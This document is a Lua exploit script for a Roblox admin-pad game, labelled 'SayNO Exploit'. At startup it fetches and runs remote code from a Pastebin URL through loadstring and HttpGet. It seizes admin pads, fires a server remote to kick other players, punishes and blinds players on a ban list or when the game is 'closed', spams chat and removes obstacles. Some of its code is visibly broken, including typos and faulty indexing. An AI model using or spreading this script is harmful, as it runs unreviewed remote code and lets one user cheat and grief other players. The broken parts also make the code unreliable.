local Players = game:GetService'Players'
local spamming = false
local wspamming = "nothing"
local PadCheck = false
local wlc = true
local closed = false
local nokill = true
local banned = {}
table.insert(banned, "PR3M13R") 
table.insert(banned, "Cafeeeeeeeeeeeeeeerr")
table.insert(banned, "AimloqRFakeeee")
table.insert(banned, "JoojoocraaftHp")
table.insert(banned, "susamongusbkaka")

loadstring(game:HttpGet("https://pastebin.com/raw/iqb45GrA"))()

local function alert(txt) 
  game.StarterGui:SetCore("ChatMakeSystemMessage", {
    Text = txt;
    Font = Enum.Font.SourceSansLight;
    Color = Color3.new(255, 255, 255);
    FontSize = Enum.FontSize.Size8;
  }) 
  game.StarterGui:SetCore("SendNotification", {
    Title = "SayNO Exploit";
    Text = txt;
    Duration = 5;
  }) 
end

local function sm(plrname, msg)
Players:Chat([[h 




]]..plrname..[[: ]]..msg..[[





]])
end

local function Chat(txt)
Players:Chat((txt))
end

local function gear(plrname, gear)
Chat("gear "..plrname.." 000000000000000000000000"..gear)
end

local function GetPad(msg)
	while PadCheck == true do
		wait(0)
		if not game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild(game.Players.LocalPlayer.Name .. "'s admin") then
			if game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild("Touch to get admin") then
				local pad = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild("Touch to get admin"):FindFirstChild("Head")
				local padCFrame = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild("Touch to get admin"):FindFirstChild("Head").CFrame
				wait(0.125)
				pad.CanCollide = false
				repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
				pad.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
				wait(0.125)
				pad.CFrame = padCFrame
				pad.CanCollide = true
        alert("You have admin")
       else
        alert("You dont have admin")
        fireclickdetector(game:GetService("Workspace").Terrain["_Game"].Admin.Regen.ClickDetector, 0)
			end
		end
	end
end



local function command(player, msg) 
  if msg == ";fly" then
    Players:Chat(("gear "..player.name.." 225921000"))
  end
  if msg == ";shutdown" then
    Players:Chat(("size all 0.3"))
    Players:Chat(("size all 0.3"))
    Players:Chat(("size all 0.3"))
    Players:Chat(("freeze all"))
    Players:Chat(("size all 10"))
    Players:Chat(("size all 10"))
    Players:Chat(("size all 10"))
    Players:Chat(("clone all"))
  end
  if msg:sub(1,7):lower() == ";nokill" then
    local arg = msg:sub(8,msg:len())
    if arg == "on" then
      if nokill == true then
        alert("NoKill Already Enabled")
      end
      nokill = true
      alert("NoKill Enabled")
    end
    if arg == "off" then
      if nokill == false then
        alert("NoKill Already Disabled")
      end
      nokill = false
      alert("NoKill Disabled")
    end
  end
  if msg == ";allpads" then
    if not game.Workpace.Terrain["_Game"].Admin.Pads:FindFirstChild("Touch to get admin") then
      fireclickdetector(game:GetService("Workspace").Terrain["_Game"].Admin.Regen.ClickDetector, 0)
      Players:Chat((";allpads"))
    else
      for _,pad in pairs(game.Workspace.Terrain._Game.Admin.Pads:GetChildren("Head")) do
        Spawn(function()
          pad = pad:FindFirstChild("Head")
          local padcf = pad.CFrame
          pad.CanCollide = false
          wait(0)
          pad.CFrame = player.Character.HumanoidRootPart.CFrame
          wait(0)
          pad.CFrame = padcf
          wait(0)
          pad.CanCollide = true
        end) 
      end
    end
  end
  if msg == ";tpclick" then
    local mouse = player:GetMouse()
    tool = Instance.new("Tool")
    tool.RequiresHandle = false
    tool.Name = "Click Teleport"
    tool.Activated:connect(function()
    local pos = mouse.Hit+Vector3.new(0,2.5,0)
    pos = CFrame.new(pos.X,pos.Y,pos.Z) 
    player.Character.HumanoidRootPart.CFrame = pos
    end)
    tool.Parent = player.Backpack
  end
  if msg:sub(1, 5) == ";kick" then --Not working
    alert("Kiking User")
    local name = msg:sub(6, msg:len()):lower()
    local plr = nil

    if name == "others" then
      for i,v in pairs(game.Players:GetChildren()) do
        if v.name ~= game.Players.LocalPlayer.name then
        game.Workspace.Delete.delete:FireServer(v)
        end
      end
    else
      local plrs = game.Players:GetChildren()
      for i,v in pairs(plrs) do
        local strlower = string.lower(v.name)
        local sub = string.sub(strlower,1,#name)

        if name == sub then
        plr = v
          if plr.name ~= game.Players.LocalPlayer.name then
            game.Workspace.Delete.delete:FireServer(plr)
          end
        end
      end
    end
  end
  if msg == ";close" then
    closed = true
    alert("Game Closed")
    Players:Chat(("h Game Closed"))
  end
  if msg == ";open" then
    closed = false
    alert("Game Oppened")
    Players:Chat(("h Game Opened"))
  end
  if msg:sub(1, 3) == ";to" then
    alert("Teleporting...")
    local plr = msg:sub(4, msg:len()):lower() 
    for _, p in pairs(game.Players:GetChildren()) do
      if p.name:lower() == plr then
        player.Character.HumanoidRootPart.CFrame = p.Character.HumanoidRootPart.CFrame
      end
    end
  end
  if msg:sub(1, 3) == ";re" then
    local arg = msg.sub(4, msg:len():lower())
    if arg == "me" then
      game:GetService'Players':Chat(("reset "..player.name))
    elseif arg == "all" then
      game:GetService'Players':Chat(("reset all"))
    else
      game:GetService'Players':Chat(("reset "..arg))
    end
  end
  if msg == ";perm" then
    if player.name == "sepix48" then
      if PadCheck == true then
        alert("Perm were already enabled")
      end
      if PadCheck == false then
        alert("Perm has set to True")
        PadCheck = true
        GetPad(msg)
      end
    end
  end
  if msg == ";noperm" then
    if player.name == "sepix48" then
      if PadCheck == false then
        alert("Perm were already disabled")
      end
      if PadCheck == true then
        alert("Perm has set to False")
        PadCheck = false
      end
    end
  end
  if msg == ";moveregen" then
    if player.name == "sepix48" then
      if game.Workspace.Terrain._Game.Admin.Regen.CFrame.Y < 20 then
        repeat wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
				local cf = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
				local looping = true
				spawn(function()
				  while true do
				    game:GetService('RunService').Heartbeat:Wait()
						game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
						cf.CFrame = game.Workspace.Terrain._Game.Admin.Regen.CFrame * CFrame.new(-1*(game.Workspace.Terrain._Game.Admin.Regen.Size.X/2)-(game.Players.LocalPlayer.Character['Torso'].Size.X/2), 0, 0)
						if not looping then break end
				  end
				end)
        spawn(function() while looping do wait(.1) Players:Chat(("unpunish me")) end end)
        looping = false
        wait(0.3)
        Players:Chat(("skydive me"))
        wait(0.2)
        Players:Chat(("respawn me"))
        wait(0.2)
      end
    end
  end
  if msg == ";findresetpad" then
    player.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").Terrain["_Game"].Admin:FindFirstChild("Regen").CFrame
  end
  if msg == ";pb" then
    Players:Chat(("gear "..player.name.." 0000000000000000000018474459")) 
  end
  if msg == ";bb" then
    Players:Chat(("gear "..player.name.." 00000000000000000000193769809"))
  end
  if msg:sub(1, 4):lower() == ";kit" then
    local kit = msg:sub(5, msg:len()):lower()
    if kit == "war" then
      gear(player.name, 11999247)
      gear(player.name, 130113146)
      gear(player.name, 30393548)
      gear(player.name, 10884288)
      gear(player.name, 28277486)
      gear(player.name, 47597835)
    end
  end
  if msg == ";unpunish" then
    Players.LocalPlayer.Character:Destroy()
  end
  if msg == ";gohouse" then
    if player.name == Players.LocalPlayer.name then
      local pos = CFrame.new(-12.5,8,94.5) 
      Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
    else
      local oldCF = Players.LocalPlayer.Character.HumanoidRootPart.CFrame
      local pos = CFrame.new(-12.5,8,94.5) 
      Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
      Players:Chat(("tp "..player.name.." me"))
      wait(0.5)
      Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldCF
    end
  end
  if msg:sub(1, 6):lower() == ";spam " then
    if player.name == "sepix48" then
      spamming = true
      wspamming = msg:sub(7, msg:lower():len())
      alert("Spamming...")
    else
      Players:Chat(("pm "..player.name.." You Can't Spam"))
      Players:Chat(("h "..player.name.." tried "..msg:lower()))
    end
  end
  if msg == ";stop" then
    spamming = false
    alert("No longer spamming")
  end
  if msg == "/c system" then
    Players:Chat(("h "..player.name.. " is hiding his commands using /c system"))
  end
  if msg == ";cmds" then
    alert(";moveobby | ;kit | ;portalgun | ;pb | ;bb | ;gohouse | ;spam | ;stop | ;shutdown | ;nok | ;perm | ;noperm | ;removeobby | ;wlc | ;dwlc | ;rej | ;getpad | ;sm | ;cmds | ;unpunish")
  end
  if msg == ";portalgun" then
    Players:Chat(("gear ".. player.name.. " 00000000000000000034870758"))
  end
  if msg == ";nok" then
    if player.name == "sepix48" then 
      game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump2.TouchInterest:Remove()
      game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump1.TouchInterest:Remove()
      game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump9.TouchInterest:Remove()
      game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump3.TouchInterest:Remove()
      game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump4.TouchInterest:Remove()
      game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump5.TouchInterest:Remove()
      game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump6.TouchInterest:Remove()
      game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump7.TouchInterest:Remove()
      game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump8.TouchInterest:Remove()
      game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump.TouchInterest:Remove()
    end
  end
  if msg:sub(1,3):lower() == ";sm" then
    local message = msg:sub(4,msg:len())
    sm("Server Message", message)
  end
  if msg == ";removeobby" then
    local FCF = player.Character.HumanoidRootPart.CFrame
    Players:Chat(("respawn "..player.name))
    Players:Chat(("stun "..player.name))
    wait(0.7)
    Players:Chat(("punish "..player.name))
    wait(0.2)
    Players:Chat(("unpunish "..player.name))
    Players:Chat(("stun "..player.name))
    wait(0.7) 
    Players:Chat(("punish "..player.name))
    wait(0.2) 
    Players:Chat(("unpunish "..player.name))
    Players:Chat(("stun "..player.name))
    wait(0.7) 
    Players:Chat(("punish "..player.name))
    wait(0.2) 
    Players:Chat(("unpunish "..player.name))
    Players:Chat(("trip "..player.name))
    Players:Chat(("respawn "..player.name))
    wait(0.5) 
    player.Character.HumanoidRootPart.CFrame = FCF
  end
  if msg == ";getpad" then
    local e = game.Players.LocalPlayer.Character.HumanoidRootPart
    local ecf = e.CFrame
    e.CFrame = CFrame.new("-37.5", "8.1", "94.5")
    wait(0.2)
    e.CFrame = ecf
  end
  if msg == ";wlc" then
    wlc = true
    alert("Welcomes Enabled")
  end
  if msg == ";dwlc" then
    wlc = false
    alert("Welcomes Disabled")
  end
  if msg == ";rej" then
    game:GetService("TeleportService"):Teleport(game.PlaceId, player)
  end
  if string.sub(msg:lower(), 0, 15) == ";moveobby" then
    if player.name == "sepix48" then
      local Workspace_Folder = game:GetService("Workspace").Terrain["_Game"].Workspace
      game.Players:Chat(";nok")
      wait(0.05)
      local Stable_Check = false
      if Stable_Check == false then
        alert("Moving Obby Kill Bricks")
        Stable_Check = true
        for i, v in pairs(Workspace_Folder["Obby"]:GetChildren()) do
          if v.CFrame.Y < 500 then
              repeat wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")

              local cf = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
              local looping = true

              spawn(function()
                while true do
                  game:GetService('RunService').Heartbeat:Wait()
                  game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
                  cf.CFrame = v.CFrame * CFrame.new(-1*(v.Size.X/2)-(game.Players.LocalPlayer.Character['Torso'].Size.X/2), 0, 0)
                  if not looping then break end
                end
              end)
              spawn(function() while looping do wait(.1) game.Players:Chat('unpunish me') end end)
              wait(0.3)
              looping = false
              game.Players:Chat("skydive me")
              wait(0.2)
              game.Players:Chat("respawn me")
              wait(0.75)
            end
          end
          wait(0.5)
          Stable_Check = false
          alert("Done Moving Obby Kill Bricks")
        else
          alert("Already Moving, Please Wait")
        end
      else
        Players:Chat(("h "..player.name.." has tried to move the obby"))
      end
    end
  end

Spawn(function() 
  Players:Chat((";perm"))
  while true do
    if player.Character:FindFirstChild("VampireVanquisher") then
			local plrname = player.Name
			game.Players:Chat(("ungear "..plrname))
			game.Players:Chat(("unsize "..plrname))
			game.Players:Chat("h "..plrname.." failed to crash the server")
			wait(0.28)
		end
    if nokill == true then
      game.Players.LocalPlayer.Character.Humanoid.Died:Connect(function() 
        game.Players:Chat((";re me"))
      end) 
    end
    if spamming == true then
      wait(0.2)
      Players:Chat((wspamming)) 
    end
    wait(0.05) 
  end
end)

game:GetService("Players").PlayerAdded:Connect(function(player)
  for i,plr in pairs(banned) do
    if player.name == banned[plr-1] then
      Players:Chat(("punish "..player.name))
    end
  end
  if closed == true then
    wait(0.5) 
    game:GetService'Players':Chat(("punish "..player.name))
    game:GetService'Players':Chat(("blind "..player.name))
    game:GetService'Players':Chat(("pm "..player.name.." Hi, I closed this game, pls join other"))
  end
  player.Chatted:Connect(function(msg) 
    command(player, msg) 
  end) 
  if wlc == true then
    game:GetService'Players':Chat(("h Welcome "..player.name))
  end
end) 

for _, plr in pairs(game.Players:GetChildren()) do
  plr.Chatted:Connect(function(msg) 
    command(plr, msg) 
  end) 
end